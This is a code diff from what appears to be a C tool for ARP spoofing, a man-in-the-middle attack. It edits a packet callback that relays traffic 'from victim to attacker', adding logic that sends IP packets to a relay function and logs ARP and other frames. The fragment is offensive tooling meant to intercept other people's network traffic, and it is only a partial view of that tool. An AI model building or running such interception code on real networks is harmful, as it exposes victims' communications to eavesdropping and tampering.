@@ -175,12 +175,30 @@ int arp_spoof(u_int8_t *src_mac, u_int32_t src_ip, const struct sniff_ethernet *
   	else
     		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(ln_context));
 }
-void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){\
+void relayer_got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
 	printf("Sending response from victim to attacker\n");
 											      
 											      
 	const struct sniff_ethernet *ethernet;
-	
+	ethernet = strip_ethernet(header, packet);
+	struct ether_header *eptr = (struct ether_header *) packet;
+	// Do a couple of checks to see what packet type we have..
+	if (ntohs (eptr->ether_type) == ETHERTYPE_IP)
+    	{
+        printf("Ethernet type hex:%x dec:%d is an IP packet\n",
+                ntohs(eptr->ether_type),
+                ntohs(eptr->ether_type));
+	relay_IP(ethernet, ip, tcp, ip_payload, ip_payload_s);
+    	}else  if (ntohs (eptr->ether_type) == ETHERTYPE_ARP)
+    	{
+        printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
+                ntohs(eptr->ether_type),
+                ntohs(eptr->ether_type));
+    	}else {
+        	printf("Ethernet type %x not IP", ntohs(eptr->ether_type));
+        	//exit(1);
+    	}
+        printf("\n");
 	
 											      
 	
